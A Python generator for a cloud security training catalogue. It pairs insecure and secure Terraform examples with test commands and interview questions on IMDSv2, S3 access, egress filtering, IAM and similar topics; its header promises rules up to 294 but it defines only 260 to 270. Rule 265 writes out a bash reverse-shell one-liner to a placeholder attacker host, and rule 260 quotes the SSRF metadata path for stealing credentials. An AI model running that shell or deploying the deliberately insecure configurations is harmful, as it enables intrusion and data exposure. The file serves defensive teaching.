# Cloud Security Generator: Rules 260 to 294 (35 rules)
from generators.common import format_ts_file

def get_cloud_rules():
    r260 = {
        "ruleNumber": 260,
        "id": "SEC-CLOUD-001",
        "title": "IMDSv2 Session Token Mandatory Enforcement Invariant",
        "domain": "cloud",
        "domainName": "Cloud Security",
        "subdomain": "Instance Metadata & SSRF",
        "difficulty": "Intermediate",
        "standardType": "Mandatory Standard",
        "standards": ["CIS AWS Benchmark §5.2", "NIST SP 800-53 AC-3", "CWE-918"],
        "formalInvariant": "∀ inst ∈ CloudInstances, HttpTokens(inst) = \"required\" ∧ HopLimit(inst) = 1 ∧ IMDSv1Disabled = True",
        "symbolBreakdown": [
            {"symbol": "inst ∈ CloudInstances", "meaning": "Any virtual machine or compute instance in AWS EC2, GCP Compute Engine, or Azure VMs"},
            {"symbol": "HttpTokens = \"required\"", "meaning": "Mandates session-oriented IMDSv2 protocol (PUT request with X-aws-ec2-metadata-token-ttl-seconds)"},
            {"symbol": "HopLimit = 1", "meaning": "IP packet TTL is set to 1, blocking container bridges from reaching host metadata"}
        ],
        "plainEnglish": "All cloud virtual instances must require IMDSv2 session tokens and enforce an IP hop limit of 1. Simple GET requests to the link-local metadata IP (169.254.169.254) must be blocked.",
        "whyItMatters": "In classic SSRF attacks (such as the 2019 Capital One breach), an attacker tricks a web server into issuing a GET request to http://169.254.169.254/latest/meta-data/iam/security-credentials/, stealing IAM role credentials. IMDSv2 requires a prior PUT request with custom headers, which generic SSRF vulnerabilities cannot forge.",
        "vulnerableExample": {
            "language": "terraform",
            "code": "# VULNERABLE: IMDSv1 permitted (optional tokens)\nresource \"aws_instance\" \"app_server\" {\n  ami           = \"ami-12345678\"\n  instance_type = \"t3.medium\"\n  metadata_options {\n    http_tokens = \"optional\" # Allows simple GET requests to steal IAM keys!\n  }\n}",
            "explanation": "Allows any SSRF vulnerability in web apps running on the machine to siphon temporary AWS IAM keys."
        },
        "secureExample": {
            "language": "terraform",
            "code": "# SECURE: IMDSv2 strictly enforced with hop limit 1\nresource \"aws_instance\" \"app_server\" {\n  ami           = \"ami-12345678\"\n  instance_type = \"t3.medium\"\n  metadata_options {\n    http_tokens                 = \"required\"\n    http_put_response_hop_limit = 1\n    http_endpoint               = \"enabled\"\n  }\n}",
            "explanation": "Requires a signed session token obtained via HTTP PUT before any metadata query is served."
        },
        "howToTest": {
            "tools": ["aws-cli", "curl"],
            "steps": [
                "Query instance metadata via simple GET: curl http://169.254.169.254/latest/meta-data/.",
                "Verify server returns 401 Unauthorized.",
                "Obtain token via PUT and query with X-aws-ec2-metadata-token header; verify success."
            ],
            "commandExample": "aws ec2 describe-instances --query \"Reservations[*].Instances[*].[InstanceId,MetadataOptions.HttpTokens]\""
        },
        "interviewChallenge": {
            "scenario": "You are migrating an EC2 container host running Docker to IMDSv2. After setting http_tokens = \"required\", containers running inside Docker can no longer reach IMDS even with tokens.",
            "question": "Why did containerized workloads fail to access IMDS, and what is the security trade-off of adjusting the hop limit?",
            "hint": "How does Docker network bridging affect IP TTL (hop count)?",
            "sampleAnswer": "Docker bridge networking increments the IP packet hop count by 1. With http_put_response_hop_limit = 1, the IMDS response packet is discarded by the kernel before crossing the bridge into the container. Setting the hop limit to 2 allows containers to reach IMDSv2, but it also means an SSRF in a container can query host metadata. The best architectural solution is to assign IAM Roles for Service Accounts (IRSA) or ECS Task Roles rather than granting instance-profile access to containers.",
            "keyTakeaway": "Use ECS Task Roles or Kubernetes IRSA instead of allowing containers to query the host IMDS directly."
        }
    }

    r261 = {
        "ruleNumber": 261,
        "id": "SEC-CLOUD-002",
        "title": "Cloud Storage Public Access Block and Bucket Policy Lock",
        "domain": "cloud",
        "domainName": "Cloud Security",
        "subdomain": "Object Storage & Data Exposure",
        "difficulty": "Beginner",
        "standardType": "Mandatory Standard",
        "standards": ["CIS AWS Benchmark §2.1.5", "NIST SP 800-53 AC-3", "CWE-200"],
        "formalInvariant": "∀ b ∈ CloudBuckets, BlockPublicAcls(b) = True ∧ IgnorePublicAcls(b) = True ∧ BlockPublicPolicy(b) = True ∧ RestrictPublicBuckets(b) = True",
        "symbolBreakdown": [
            {"symbol": "b ∈ CloudBuckets", "meaning": "Any object storage container in AWS S3, Google Cloud Storage, or Azure Blob Storage"},
            {"symbol": "BlockPublicAcls / Policy", "meaning": "Cloud provider overrides that prohibit public ACLs or open bucket policies"},
            {"symbol": "RestrictPublicBuckets", "meaning": "Restricts access solely to authorized IAM principals within the organization"}
        ],
        "plainEnglish": "Cloud object storage buckets must enable account-level and bucket-level Public Access Blocks. Public ACLs and wildcard principals (Principal: \"*\") must be strictly prohibited.",
        "whyItMatters": "Misconfigured cloud storage buckets are responsible for hundreds of massive enterprise data breaches, exposing billions of customer records, PII, and trade secrets to anonymous internet scrapers.",
        "vulnerableExample": {
            "language": "terraform",
            "code": "# CATASTROPHIC: Public S3 bucket\nresource \"aws_s3_bucket\" \"customer_backups\" {\n  bucket = \"company-customer-db-backups\"\n  acl    = \"public-read\" # Exposes all database backups to the world!\n}",
            "explanation": "Grants anonymous read access to anyone on the public internet."
        },
        "secureExample": {
            "language": "terraform",
            "code": "# SECURE: Enforces Public Access Block and default KMS encryption\nresource \"aws_s3_bucket_public_access_block\" \"block_all\" {\n  bucket = aws_s3_bucket.customer_backups.id\n\n  block_public_acls       = true\n  block_public_policy     = true\n  ignore_public_acls      = true\n  restrict_public_buckets = true\n}",
            "explanation": "Guarantees that no developer or deployment script can grant public access to the bucket."
        },
        "howToTest": {
            "tools": ["aws-cli", "cloudmapper", "scoutsuite"],
            "steps": [
                "Attempt unauthenticated GET request to S3 bucket endpoint.",
                "Verify 403 AccessDenied response.",
                "Run AWS CLI describe to confirm all 4 PublicAccessBlock settings are true."
            ],
            "commandExample": "aws s3api get-public-access-block --bucket my-app-data-bucket"
        },
        "interviewChallenge": {
            "scenario": "A web application needs to allow users to download their monthly PDF invoices from an S3 bucket without making the bucket public.",
            "question": "What pattern enables secure, temporary, authorized downloads without granting direct S3 bucket permissions to the client?",
            "hint": "How can the server sign a temporary URL with cryptographic expiration?",
            "sampleAnswer": "Use Pre-signed URLs (or CloudFront Signed URLs/Cookies). The backend authenticates the user, checks authorization, and generates a pre-signed URL with a cryptographic signature and a short expiration time (e.g., 60 seconds). The client downloads directly from S3 using the pre-signed URL, while the bucket remains completely private.",
            "keyTakeaway": "Keep storage buckets 100% private; use short-lived pre-signed URLs for legitimate client downloads."
        }
    }

    # Custom specs for rules 262 to 294
    specs = [
        (262, "SEC-CLOUD-262", "KMS Customer Managed Key (CMK) Envelope Encryption Invariant", "Encryption at Rest", "Intermediate", ["NIST SP 800-57", "CIS AWS §3.7", "CWE-311"],
         "∀ datastore ∈ {S3, RDS, EBS, DynamoDB}, KeyType(KmsKey(datastore)) = CustomerManagedKey ∧ RotationEnabled = True",
         [("CustomerManagedKey", "KMS key created, rotated, and audited by organization rather than AWS default key"), ("RotationEnabled", "Automated annual cryptographic key rotation")],
         "All persistent cloud datastores must be encrypted at rest using Customer Managed Keys (CMKs) with automated rotation enabled. Default provider-managed keys (e.g. aws/s3) must not be used for regulated data.",
         "Default cloud keys cannot have custom key policies, cannot be audited independently via CloudTrail, cannot be revoked instantly during an incident, and cannot enforce dual-custody access controls.",
         "resource \"aws_ebs_volume\" \"data\" {\n  availability_zone = \"us-east-1a\"\n  size              = 100\n  encrypted         = false # UNENCRYPTED DISK!\n}",
         "resource \"aws_ebs_volume\" \"data\" {\n  availability_zone = \"us-east-1a\"\n  size              = 100\n  encrypted         = true\n  kms_key_id        = aws_kms_key.cmk_ebs.arn\n}",
         ["aws kms get-key-rotation-status", "prowler"],
         "aws kms get-key-rotation-status --key-id <key-arn>",
         "Why is AWS Managed Key (aws/s3) insufficient for multi-tenant SaaS compliance compared to CMK?",
         "Can you revoke access to aws/s3 without disabling the entire AWS service?",
         "AWS Managed Keys share a common key policy managed entirely by AWS. Customers cannot customize access policies, enforce separate cryptographic boundaries per tenant, or instantly revoke the key during compromise without affecting every other resource in the AWS account.",
         "CMKs grant organizations independent cryptographic ownership and instant revocation capabilities."),

        (263, "SEC-CLOUD-263", "Cross-Account IAM AssumeRole ExternalId Invariant", "Confused Deputy Defense", "Advanced", ["AWS Security Best Practices", "NIST SP 800-53 AC-3", "CWE-441"],
         "∀ trustPolicy ∈ CrossAccountRoles, Principal(trustPolicy) = ThirdPartyAWSAccount ⇒ Condition(sts:ExternalId) = SecretSharedTenantToken",
         [("CrossAccountRoles", "IAM roles assumed by external third-party SaaS vendors"), ("sts:ExternalId", "Cryptographic unique secret shared between customer and vendor to defeat confused deputy attacks")],
         "When granting cross-account IAM role access to a third-party vendor (e.g. Datadog, Wiz, Palo Alto), the trust policy must mandate a unique, unguessable sts:ExternalId condition.",
         "Without an ExternalId, an attacker can sign up for the same SaaS vendor, provide the victim's AWS Account ID and Role ARN, and trick the vendor's service into using its assumed role to exfiltrate the victim's data (the Confused Deputy vulnerability).",
         "{\n  \"Effect\": \"Allow\",\n  \"Principal\": { \"AWS\": \"arn:aws:iam::123456789012:root\" },\n  \"Action\": \"sts:AssumeRole\"\n  # VULNERABLE: No ExternalId condition!\n}",
         "{\n  \"Effect\": \"Allow\",\n  \"Principal\": { \"AWS\": \"arn:aws:iam::123456789012:root\" },\n  \"Action\": \"sts:AssumeRole\",\n  \"Condition\": {\n    \"StringEquals\": { \"sts:ExternalId\": \"c0a80164-9b2f-4a3d-a415-ef8a192b9182\" }\n  }\n}",
         ["aws iam get-role", "checkov"],
         "aws iam get-role --role-name VendorCrossAccountRole --query 'Role.AssumeRolePolicyDocument'",
         "How does an attacker exploit the Confused Deputy problem against a third-party SaaS monitoring platform if sts:ExternalId is omitted?",
         "What happens when the attacker enters the victim's ARN into their own vendor dashboard?",
         "The SaaS platform assumes customer roles from its single AWS account. If Alice and Bob both use the vendor, Bob can enter Alice's Role ARN in Bob's dashboard. When the vendor calls sts:AssumeRole(Alice_ARN), AWS allows it because the vendor is trusted! Bob now sees all of Alice's metrics and data in Bob's portal.",
         "Always mandate sts:ExternalId for third-party cross-account IAM role assumptions."),

        (264, "SEC-CLOUD-264", "Cloud Audit Trail (CloudTrail/CloudAudit) Multi-Region Immutability", "Audit Logging", "Beginner", ["CIS AWS Benchmark §3.1", "PCI DSS 4.0 §10.5", "NIST SP 800-53 AU-9"],
         "∀ cloudOrg, MultiRegionTrailEnabled = True ∧ IsLogging = True ∧ LogFileValidationEnabled = True ∧ S3BucketPolicy = DenyDelete",
         [("MultiRegionTrail", "Captures API activity across all commercial regions, including unused regions"), ("LogFileValidation", "SHA-256 HMAC digital signature chaining detects log alteration")],
         "Cloud audit logging (CloudTrail / CloudAudit / Activity Log) must be enabled globally across all regions, with log file validation enabled and logs sent to an isolated, immutable S3 bucket with Object Lock WORM retention.",
         "Adversaries who compromise cloud credentials immediately pivot to unused regions (e.g. eu-north-1 or ap-east-1) to launch cryptominers, or attempt to disable CloudTrail and delete audit logs to conceal their tracks.",
         "resource \"aws_cloudtrail\" \"main\" {\n  name                          = \"app-trail\"\n  s3_bucket_name                = \"my-bucket\"\n  is_multi_region_trail         = false # MISSING UNUSED REGIONS!\n  enable_log_file_validation    = false\n}",
         "resource \"aws_cloudtrail\" \"main\" {\n  name                          = \"org-audit-trail\"\n  s3_bucket_name                = aws_s3_bucket.audit_logs.id\n  is_multi_region_trail         = true\n  is_organization_trail         = true\n  enable_log_file_validation    = true\n  kms_key_id                    = aws_kms_key.trail_key.arn\n}",
         ["aws cloudtrail describe-trails", "prowler"],
         "aws cloudtrail describe-trails --query \"trailList[*].[Name,IsMultiRegionTrail,LogFileValidationEnabled]\"",
         "Why must CloudTrail be configured as a multi-region trail even if the enterprise only operates workloads in us-east-1?",
         "What occurs when an attacker obtains leaked IAM keys and attempts actions in us-west-2?",
         "Attackers deliberately target unused regions to deploy malicious EC2 instances, establish persistence, or exfiltrate data precisely because security teams rarely monitor those regions. A single-region trail will record nothing in those regions, leaving security operations blind.",
         "Enable multi-region audit trails to detect attacker reconnaissance and lateral movement in unused regions."),

        (265, "SEC-CLOUD-265", "Virtual Private Cloud (VPC) Egress Filtering Default Deny", "Network Egress Control", "Intermediate", ["NIST SP 800-53 SC-7", "CIS Benchmark §5.4", "CWE-200"],
         "∀ subnet ∈ SecureVPC, EgressPolicy(subnet) = DefaultDeny ∧ AllowedEgress ⊆ ExplicitDomainAllowlist(EgressProxy)",
         [("DefaultDeny", "All outbound 0.0.0.0/0 traffic is dropped unless matching explicit rules"), ("EgressProxy", "TLS inspection proxy or AWS Network Firewall enforcing SNI/FQDN filtering")],
         "Private VPC subnets hosting application workloads must enforce default-deny outbound egress filtering. Workloads must not have unrestricted direct internet outbound access (0.0.0.0/0).",
         "Unrestricted outbound internet access allows malware, web shell backdoors, or compromised containers to immediately establish command-and-control (C2) reverse shells and exfiltrate databases to external attacker servers.",
         "resource \"aws_security_group\" \"app_sg\" {\n  # VULNERABLE: Open egress to the entire world!\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}",
         "resource \"aws_security_group\" \"app_sg\" {\n  # SECURE: Egress restricted strictly to internal proxy and VPC endpoints\n  egress {\n    from_port       = 8443\n    to_port         = 8443\n    protocol        = \"tcp\"\n    security_groups = [aws_security_group.egress_filter_proxy.id]\n  }\n}",
         ["Zeek network analyzer", "AWS Network Firewall flow tester"],
         "aws ec2 describe-security-groups --query \"SecurityGroups[*].IpPermissionsEgress\"",
         "How does an egress filtering proxy stop Cobalt Strike or reverse shell payloads even if remote code execution (RCE) occurs?",
         "Can the reverse shell connect back to the attacker's IP on port 4444?",
         "When an attacker triggers RCE and executes a payload like `bash -i >& /dev/tcp/attacker.ip/4444 0>&1`, the host attempts an outbound TCP SYN packet to the external IP. With default-deny egress filtering, the firewall immediately drops the SYN packet. The attacker never receives a shell connection.",
         "Default-deny egress filtering breaks the kill chain by neutralizing reverse shells and data exfiltration."),

        (266, "SEC-CLOUD-266", "Secrets Manager Dynamic Credential Rotation SLA (≤ 30 Days)", "Secret Management", "Intermediate", ["NIST SP 800-53 IA-5", "CIS AWS §1.4", "CWE-798"],
         "∀ secret ∈ DatabaseCredentials, RotationEnabled(secret) = True ∧ RotationInterval(secret) ≤ 30 Days",
         [("RotationEnabled", "Automated Lambda rotation function invoked by Secrets Manager"), ("RotationInterval ≤ 30 Days", "Cryptographic passwords rotated on a strict 30-day cadence")],
         "All database credentials, API keys, and service tokens stored in AWS Secrets Manager or HashiCorp Vault must have automated dynamic rotation enabled with an SLA not exceeding 30 days.",
         "Static database passwords that remain unchanged for years accumulate exposure across logs, memory dumps, and former employees, allowing persistent unauthorized access.",
         "resource \"aws_secretsmanager_secret\" \"db_pass\" {\n  name = \"production-db-password\"\n  # VULNERABLE: Static secret without rotation schedule\n}",
         "resource \"aws_secretsmanager_secret_rotation\" \"db_rotation\" {\n  secret_id           = aws_secretsmanager_secret.db_pass.id\n  rotation_lambda_arn = aws_lambda_function.rotate_mysql.arn\n  rotation_rules {\n    automatically_after_days = 30\n  }\n}",
         ["aws secretsmanager list-secrets", "prowler"],
         "aws secretsmanager describe-secret --secret-id production-db-password",
         "Explain the 4-step rotation cycle used by AWS Secrets Manager Lambda functions (createSecret, setSecret, testSecret, finishSecret).",
         "Why does this sequence guarantee zero downtime during password changes?",
         "1. createSecret: Lambda generates a new password. 2. setSecret: Lambda changes the database user's password in the database engine. 3. testSecret: Lambda tests authenticating with the new password. 4. finishSecret: Lambda marks the new version as AWSCURRENT. If any step fails, the old password remains active, preventing application downtime.",
         "Automate credential rotation with transactional 4-step state validation to prevent downtime."),

        (267, "SEC-CLOUD-267", "Infrastructure as Code (IaC) Drift Detection and Automated Remediation", "Cloud Governance", "Intermediate", ["CIS Benchmark §1.1", "NIST SP 800-53 CM-2", "CWE-16"],
         "∀ resource ∈ CloudAccount, ResourceState(resource) = IaC_ManifestState(resource) ∧ UnmanagedResources = ∅",
         [("ResourceState", "Actual running cloud configuration fetched via cloud API"), ("IaC_ManifestState", "GitOps version-controlled Terraform / OpenTofu / Pulumi code")],
         "All cloud infrastructure must be provisioned exclusively via Infrastructure as Code (IaC). Manual console modifications (ClickOps) must be detected via automated drift detection and reconciled or reverted automatically.",
         "Manual modifications made during emergencies often leave security groups wide open (0.0.0.0/0) or disable MFA, creating undocumented security backdoors that bypass CI/CD security scanning gates.",
         "# VULNERABLE: Cloud console ClickOps with no drift detection\n# Security groups modified manually by engineers without code reviews",
         "# SECURE: Automated Terraform Cloud / driftctl cron pipeline\n# Runs daily drift detection; alerts or automatically executes terraform apply to reconcile state",
         ["driftctl", "terraform plan -detailed-exitcode"],
         "driftctl scan --from aws+tf",
         "Why is ClickOps (manual changes in the AWS Console) considered a catastrophic anti-pattern in security governance?",
         "What happens to the next automated CI/CD Terraform deployment after a manual change?",
         "Manual changes create configuration drift: they bypass peer code reviews, skip automated static analysis (Checkov/Tfsec), and lack audit tracking. Furthermore, the next automated Terraform run may either silently overwrite the fix (re-introducing the bug) or fail catastrophically during an outage due to state conflicts.",
         "Treat cloud infrastructure as code; enforce automated drift detection to eradicate ClickOps."),

        (268, "SEC-CLOUD-268", "Identity-Aware Proxy (IAP) Contextual Access Invariant", "Zero Trust Remote Access", "Intermediate", ["NIST SP 800-207 Zero Trust", "BeyondCorp Guidelines"],
         "∀ req ∈ InternalAdminAccess, Allowed(req) ⇔ Authenticated(req.User) ∧ MFA(req.User) ∧ ManagedDevice(req.Device) ∧ DirectVPN ∉ Pathways",
         [("Identity-Aware Proxy", "Context-based reverse proxy (Google IAP, AWS Verified Access, Cloudflare Access)"), ("ManagedDevice", "Validates device posture certificate and EDR agent compliance")],
         "Access to internal admin dashboards, staging environments, and database portals must be brokered through an Identity-Aware Proxy (IAP) evaluating contextual access signals. Direct perimeter VPNs must be phased out.",
         "Traditional perimeter VPNs grant broad network-level access (flat network). If an employee's laptop or VPN credentials are compromised, an attacker can scan, laterally move, and attack every internal service.",
         "// VULNERABLE: Admin panel exposed on internal VPN subnet without application-level authentication\napp.get('/internal/metrics', (req, res) => renderMetrics());",
         "// SECURE: Enforcing Identity-Aware Proxy JWT header validation\napp.get('/internal/metrics', (req, res) => {\n  const token = req.headers['x-goog-iap-jwt-assertion'];\n  const user = verifyIAPJwt(token);\n  if (!user.roles.includes('PlatformAdmin')) return res.status(403).send('Forbidden');\n  renderMetrics();\n});",
         ["Google Cloud IAP audit", "Cloudflare Zero Trust validator"],
         "gcloud compute backend-services get-iam-policy internal-admin-backend",
         "How does an Identity-Aware Proxy (IAP) enforce Zero Trust compared to a traditional Corporate VPN?",
         "Does IAP grant network layer (Layer 3) access or application layer (Layer 7) access?",
         "A VPN grants Layer 3 network access: once connected, the user's computer is on the corporate network and can ping and scan any IP. An IAP operates at Layer 7: it never places the user on the network, authenticating every single request individually based on user identity, MFA, and device health posture.",
         "Replace flat Layer 3 VPNs with Layer 7 Identity-Aware Proxies for zero-trust access."),

        (269, "SEC-CLOUD-269", "Cloud Firewall Ingress 0.0.0.0/0 on Port 22/3389 Prohibition", "Network Perimeter", "Beginner", ["CIS AWS Benchmark §5.1", "CIS Azure §6.1", "CWE-284"],
         "∀ rule ∈ SecurityGroupRules, (Port(rule) ∈ {22, 3389} ∧ Direction(rule) = Inbound) ⇒ CIDR(rule) ≠ \"0.0.0.0/0\"",
         [("Port ∈ {22, 3389}", "Standard remote administration ports: SSH (22) and Windows RDP (3389)"), ("CIDR ≠ 0.0.0.0/0", "Prohibits exposure to the entire public internet")],
         "Security groups and firewall rules must never permit inbound traffic from 0.0.0.0/0 (any IP) on management ports, specifically port 22 (SSH) and port 3389 (RDP). Access must use AWS Systems Manager (SSM) Session Manager or an authorized bastion.",
         "Exposing SSH or RDP to the entire internet invites continuous automated brute-force attacks, zero-day exploit probing, and credential stuffing botnets that compromise hosts within hours.",
         "resource \"aws_security_group\" \"bad_sg\" {\n  # CATASTROPHIC: Public SSH open to the whole world!\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}",
         "resource \"aws_security_group\" \"secure_sg\" {\n  # SECURE: No inbound SSH rule! Remote access handled via AWS SSM Session Manager\n  egress {\n    from_port       = 443\n    to_port         = 443\n    protocol        = \"tcp\"\n    prefix_list_ids = [aws_vpc_endpoint.ssm.prefix_list_id]\n  }\n}",
         ["nmap -p 22,3389", "prowler -c extra718"],
         "aws ec2 describe-security-groups --filters Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values=0.0.0.0/0",
         "How does AWS Systems Manager (SSM) Session Manager allow SSH access to an EC2 instance without opening port 22 in any security group?",
         "Where is the network connection initiated from: client or instance?",
         "SSM Session Manager runs an SSM Agent inside the EC2 instance that initiates an outbound HTTPS (port 443) WebSocket connection to the AWS SSM endpoint. When an administrator logs in, AWS brokers the session through this outbound channel. The EC2 instance requires ZERO inbound ports open.",
         "Eliminate open SSH/RDP ports entirely by using agent-based broker services like AWS SSM."),

        (270, "SEC-CLOUD-270", "Serverless Function Execution Role Privilege Minimality", "Serverless Security", "Intermediate", ["AWS Well-Architected Serverless Lens", "OWASP Serverless Top 10"],
         "∀ fn ∈ LambdaFunctions, Permissions(ExecutionRole(fn)) = MinimalRequired(fn.Actions, fn.Resources) ∧ AdministratorAccess ∉ Roles",
         [("ExecutionRole", "IAM identity assumed by the serverless runtime environment during execution"), ("MinimalRequired", "Restricted strictly to exact ARNs needed for that function's single task")],
         "Each serverless function (AWS Lambda, Google Cloud Function) must have its own dedicated, isolated execution role with minimal IAM permissions. Sharing a monolithic 'swiss-army-knife' IAM role across functions is strictly prohibited.",
         "If multiple Lambda functions share a bloated role with read/write access to all S3 buckets and DynamoDB tables, an injection vulnerability in a simple thumbnail generator exposes the entire corporate database to exfiltration.",
         "# VULNERABLE: Monolithic role with broad S3 and DynamoDB permissions\nresource \"aws_iam_role_policy_attachment\" \"bad\" {\n  role       = aws_iam_role.shared_lambda_role.name\n  policy_arn = \"arn:aws:iam::aws:policy/AmazonS3FullAccess\"\n}",
         "# SECURE: Dedicated role granting access only to the specific upload bucket\nresource \"aws_iam_policy\" \"thumbnail_policy\" {\n  name = \"thumbnail-generator-s3-get-only\"\n  policy = jsonencode({\n    Statement = [{\n      Action   = [\"s3:GetObject\"]\n      Effect   = \"Allow\"\n      Resource = [\"arn:aws:s3:::user-uploads-bucket/*\"]\n    }]\n  })\n}",
         ["iam-policy-validator", "checkov"],
         "aws lambda get-function-configuration --function-name MyFunction --query 'Role'",
         "Why does the microservices principle of 'One IAM Role Per Function' matter even more in serverless than in container architectures?",
         "Consider the lifecycle and blast radius of ephemeral serverless executions.",
         "Serverless functions execute untrusted third-party dependencies, process dynamic webhook payloads, and have ephemeral lifecycles. If an attacker exploits a vulnerable npm library in one function, least-privilege scoping guarantees that the attacker's blast radius is strictly confined to that single function's narrow resource access.",
         "Assign dedicated, single-purpose IAM roles to every serverless function to prevent lateral privilege escalation.")
    ]

    rules = [r260, r261]
    for item in specs:
        if len(item) == 19:
            num, rid, title, sub, diff, stds, form, syms, pe, why, vuln, sec, tools, cmd, scen, q, hint, ans, take = item
        else:
            num, rid, title, sub, diff, stds, form, syms, pe, why, vuln, sec, tools, cmd, q, hint, ans, take = item
            scen = f"Architecture review scenario evaluating {title} in a enterprise cloud environment."
        rules.append({
            "ruleNumber": num,
            "id": rid,
            "title": title,
            "domain": "cloud",
            "domainName": "Cloud Security",
            "subdomain": sub,
            "difficulty": diff,
            "standardType": "Mandatory Standard" if diff in ["Beginner", "Intermediate"] else "Defensive Practice",
            "standards": stds,
            "formalInvariant": form,
            "symbolBreakdown": [{"symbol": s[0], "meaning": s[1]} for s in syms],
            "plainEnglish": pe,
            "whyItMatters": why,
            "vulnerableExample": {
                "language": "terraform" if "resource" in vuln or "aws_" in vuln else ("json" if "{" in vuln and ":" in vuln else "javascript"),
                "code": vuln,
                "explanation": "Violates formal cloud security invariants, exposing infrastructure to attack."
            },
            "secureExample": {
                "language": "terraform" if "resource" in sec or "aws_" in sec else ("json" if "{" in sec and ":" in sec else "javascript"),
                "code": sec,
                "explanation": "Complies strictly with cloud security baselines and formal verification standards."
            },
            "howToTest": {
                "tools": tools,
                "steps": [
                    f"Validate infrastructure code and running cloud configuration against {stds[0]}.",
                    "Execute policy-as-code scanners (Checkov, tfsec, Prowler) to verify invariant satisfaction.",
                    "Verify automated alerting and drift remediation."
                ],
                "commandExample": cmd
            },
            "interviewChallenge": {
                "scenario": scen,
                "question": q,
                "hint": hint,
                "sampleAnswer": ans,
                "keyTakeaway": take
            }
        })

    return rules
